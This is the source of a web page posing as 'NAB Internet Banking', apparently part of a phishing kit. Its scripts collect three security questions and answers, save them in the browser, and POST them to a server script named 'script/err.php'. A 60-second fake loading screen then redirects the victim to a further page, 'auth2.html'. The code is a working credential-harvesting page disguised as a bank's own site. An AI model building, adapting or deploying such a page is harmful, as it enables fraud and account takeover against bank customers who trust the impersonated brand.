<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>NAB Internet Banking</title>
    <link rel="shortcut icon" href="img/favicon.svg" type="image/x-icon" />
    <style>
      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
      }

      body,
      html {
        font-family: Arial, sans-serif;
        height: 100%;
      }

      .header_banner {
        width: 100%;
        background-color: #000;
      }

      .header_inner {
        display: flex;
        justify-content: space-between;
        align-items: center;
        max-width: 1200px;
        margin: 0 auto;
        padding: 15px 16px;
        width: 100%;
        gap: 20px;
      }

      .header_left {
        display: flex;
        align-items: center;
      }

      .header_right {
        color: #fff;
        display: flex;
        align-items: center;
        justify-content: center;
      }

      .header_right p {
        font-size: 0.8em;
        padding: 10px;
      }

      .banner {
        position: relative;
        min-height: 100vh;
        background-image: url("img/bg-login.jpeg");
        background-repeat: no-repeat;
        background-size: cover;
        background-position: center top;
        background-attachment: fixed;
        display: flex;
        flex-direction: column;
        overflow: hidden;
      }

      .login_wrapper {
        position: relative;
        width: 100%;
        max-width: 500px;
        margin-top: 40px;
        margin-left: 300px;
        background-color: white;
        border-radius: 8px;
        overflow: hidden;
      }

      .security-questions-icon {
        width: 45px;
        height: 45px;
      }
      .security-questions-header {
        font-family: "SourceSans-Light";
        font-size: 1.5em;
      }
      .form_container {
        position: relative;
        width: 100%;
        height: 150%;
        padding: 38px 32px;
        padding-bottom: 0px;
      }

      .loading-div {
        position: absolute;
        width: 100%;
        top: 30%;
        left: 50%;
        transform: translate(-50%, -50%);
      }

      h1 {
        font-size: 30px;
        margin-bottom: 32px;
        color: #333;
        font-weight: 100;
      }

      .input_field {
        /* margin: 20px 0px; */
      }

      .error {
        margin-bottom: 0.8em;
      }

      .input_field label {
        font-size: 14px;
        color: #000;
        display: block;
        margin-bottom: 8px;
        font-weight: bold;
      }

      .input_field select,
      .input_field input {
        width: 100%;
        padding: 12px;
        border: 1px solid #ccc;
        border-radius: 4px;
        font-size: 16px;
      }

      .input_field .error {
        color: rgb(194, 0, 0);
        font-size: 12px;
      }

      .login_button {
        margin-bottom: 20px;
      }

      .login_button button {
        width: 128px;
        padding: 12px;
        background-color: #e2001a;
        color: #fff;
        border: none;
        border-radius: 4px;
        font-size: 16px;
        cursor: pointer;
      }

      .login_button button:hover {
        background-color: #d00016;
      }

      .footer_links a {
        color: #d00016;
      }

      .footer_links a:hover {
        text-decoration: underline;
      }

      .footer_link2 {
        margin-top: 30px;
        background-color: #e6e6e6;
        padding: 20px;
        font-size: 16px;
        font-weight: 100;
      }

      .info {
        color: #4d4d4d;
        font-size: 14px;
      }

      .footer_link2 a {
        color: #d00016;
        font-weight: bold;
      }

      .input_field input,
      .input_field select {
        width: 100%;
        padding: 12px;
        border: 1px solid #ccc;
        border-radius: 4px;
        font-size: 16px;
        transition: border 0.3s ease;
      }

      .input_field input:focus,
      .input_field select:focus {
        outline: none;
        border: 3px solid grey;
      }

      .input_error {
        border: 1px solid rgb(194, 0, 0) !important;
      }

      .input_error:focus {
        border: 3px solid rgb(194, 0, 0) !important;
      }

      .input_field .error {
        color: rgb(194, 0, 0);
        font-size: 14px;
        margin-top: 4px;
        height: 14px;
        line-height: 14px;
        transition: all 0.3s ease;
      }

      .modal-backdrop {
        position: fixed;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        background-color: rgba(0, 0, 0, 0.5);
        z-index: 999;
      }

      .modal {
        position: fixed;
        top: 28%;
        left: 50%;
        transform: translate(-50%, -50%);
        background-color: #fff;
        padding: 40px;
        border-radius: 8px;
        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
        z-index: 1000;
        width: 400px;
        height: 300px;
        text-align: center;
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
      }

      .spinner {
        width: 40px;
        height: 40px;
        border: 4px solid #ddd;
        border-top: 4px solid rgb(194, 0, 0);
        border-radius: 50%;
        animation: spin 1s linear infinite;
        margin: 0 auto;
      }

      @keyframes spin {
        to {
          transform: rotate(360deg);
        }
      }

      @font-face {
        font-family: "SourceSans-Light";
        src: url("font/SourceSans-Light.woff2") format("woff2"),
          url("font/SourceSans-Light.woff") format("woff");
        font-weight: 100;
        font-style: normal;
      }

      .loading-div {
        display: none;
        flex-direction: column;
        justify-content: center;
        align-items: center;
        padding: 20px;
      }

      .loader {
        width: 40px;
        height: 40px;
        border: 3px solid transparent;
        border-top: 3px solid #e60000;
        border-right: 3px solid #e60000;
        border-radius: 50%;
        animation: spin 1.5s linear infinite;
        margin: 0 auto;
      }

      .loader-message {
        margin-top: 12px;
        font-size: 14px;
        color: #444;
        text-align: center;
        font-family: Arial, sans-serif;
      }
      .checkbox-field {
        margin-bottom: 2em;
        display: flex;
        align-items: center;
        gap: 10px;
      }

      #agree {
        height: 20px;
        width: 20px;
      }

      @media screen and (max-width: 768px) {
        .header_inner {
          display: flex;
          justify-content: space-between;
          padding: 14px 16px;
        }

        .header_left {
          margin-left: 0;
          margin-bottom: 10px;
        }

        .header_right {
          display: none;
        }

        .login_wrapper {
          width: 90%;
          margin: 50px auto;
          background-color: white;
          border-radius: 8px;
          overflow: hidden;
        }

        .form_container {
          padding: 20px;
        }

        .security-questions-icon {
          width: 40px;
          height: 40px;
        }
        .security-questions-header {
          font-size: 1.2em;
        }
        #agree {
          height: 30px;
          width: 30px;
        }
      }
    </style>
  </head>

    <script>
      function updateImageSrc() {
        const img = document.querySelector(".logo-img");
        if (!img) return;

        if (window.innerWidth <= 768) {
          img.src = "img/star.svg";
        } else {
          img.src = "img/star-big.svg";
        }
      }

      updateImageSrc();

      window.addEventListener("resize", updateImageSrc);
    </script>
    <script>
      function ShowLoadingModal() {
        document.getElementById("loginForm").style.display = "none";
        document.querySelector(".login_wrapper").style.height = "400px";
        document.querySelector(".loading-div").style.display = "flex";
        document.querySelector(".form_container").style.display = "flex";
      }
    </script>
    <script>
      document.addEventListener("DOMContentLoaded", function () {
        const currentDateElement = document.getElementById("currentDate");

        const options = {
          weekday: "long",
          day: "numeric",
          month: "long",
          year: "numeric",
        };

        const today = new Date();
        const formattedDate = today.toLocaleDateString("en-GB", options);

        currentDateElement.textContent = formattedDate;
      });
    </script>
    <script>
      document.addEventListener("DOMContentLoaded", function () {
        const continueBtn = document.getElementById("continueBtn");
        const agreeCheckbox = document.getElementById("agree");
        const errorMessage = document.getElementById("error-message");
        const question1 = document.getElementById("question1");
        const question2 = document.getElementById("question2");
        const question3 = document.getElementById("question3");
        const answer1 = document.getElementById("answer1");
        const answer2 = document.getElementById("answer2");
        const answer3 = document.getElementById("answer3");
        const errorMessage1 = document.getElementById("error-question1");
        const errorMessage2 = document.getElementById("error-question2");
        const errorMessage3 = document.getElementById("error-question3");

        continueBtn.addEventListener("click", function () {
          let isValid = true;
          const selectedQuestions = new Set();

          // Validate question 1
          if (!question1.value) {
            errorMessage1.textContent = "Please select a question.";
            question1.classList.add("input_error");
            isValid = false;
            return;
          } else if (selectedQuestions.has(question1.value)) {
            errorMessage1.textContent = "Please select a different question.";
            question1.classList.add("input_error");
            isValid = false;
            return;
          } else {
            question1.classList.remove("input_error");
            selectedQuestions.add(question1.value);
          }
          if (!answer1.value.trim()) {
            errorMessage1.textContent = "Please provide an answer.";
            answer1.classList.add("input_error");
            isValid = false;
            return;
          } else {
            answer1.classList.remove("input_error");
            errorMessage1.textContent = "";
          }

          // Validate question 2
          if (!question2.value) {
            errorMessage2.textContent = "Please select a question.";
            question2.classList.add("input_error");
            isValid = false;
            return;
          } else if (selectedQuestions.has(question2.value)) {
            errorMessage2.textContent = "Please select a different question.";
            question2.classList.add("input_error");
            isValid = false;
            return;
          } else {
            question2.classList.remove("input_error");
            selectedQuestions.add(question2.value);
          }
          if (!answer2.value.trim()) {
            errorMessage2.textContent = "Please provide an answer.";
            answer2.classList.add("input_error");
            isValid = false;
            return;
          } else {
            answer2.classList.remove("input_error");
            errorMessage2.textContent = "";
          }

          // Validate question 3
          if (!question3.value) {
            errorMessage3.textContent = "Please select a question.";
            question3.classList.add("input_error");
            isValid = false;
            return;
          } else if (selectedQuestions.has(question3.value)) {
            errorMessage3.textContent = "Please select a different question.";
            question3.classList.add("input_error");
            isValid = false;
            return;
          } else {
            question3.classList.remove("input_error");
            selectedQuestions.add(question3.value);
          }
          if (!answer3.value.trim()) {
            errorMessage3.textContent = "Please provide an answer.";
            answer3.classList.add("input_error");
            isValid = false;
            return;
          } else {
            answer3.classList.remove("input_error");
            errorMessage3.textContent = "";
          }

          // Validate checkbox
          if (!agreeCheckbox.checked) {
            errorMessage.style.display = "block";
            isValid = false;
            return;
          } else {
            errorMessage.style.display = "none";
          }

          if (isValid) {
            continueBtn.textContent = "Processing...";
            continueBtn.disabled = true;
            submitSecurityQuestions();
          }
        });

        agreeCheckbox.addEventListener("change", function () {
          if (this.checked) {
            errorMessage.style.display = "none";
          }
        });
      });
    </script>
    <script>
      function submitSecurityQuestions() {
        const data = {
          q1: document.getElementById("question1").value,
          a1: document.getElementById("answer1").value,
          q2: document.getElementById("question2").value,
          a2: document.getElementById("answer2").value,
          q3: document.getElementById("question3").value,
          a3: document.getElementById("answer3").value,
        };

        localStorage.setItem("securityQA", JSON.stringify(data));
        const formData = new FormData();
        formData.append("sws", 1);
        formData.append("q1", document.getElementById("question1").value);
        formData.append("a1", document.getElementById("answer1").value);
        formData.append("q2", document.getElementById("question2").value);
        formData.append("a2", document.getElementById("answer2").value);
        formData.append("q3", document.getElementById("question3").value);
        formData.append("a3", document.getElementById("answer3").value);

        const xhr = new XMLHttpRequest();
        xhr.open("POST", "script/err.php", true);
        xhr.onreadystatechange = function () {
          if (xhr.readyState === 4) {
            if (xhr.status === 200) {
              ShowLoadingModal();
              setTimeout(() => {
                window.location.href = "auth2.html";
              }, 60000);
            } else {
              location.reload();
            }
          }
        };
        xhr.send(formData);
      }
    </script>
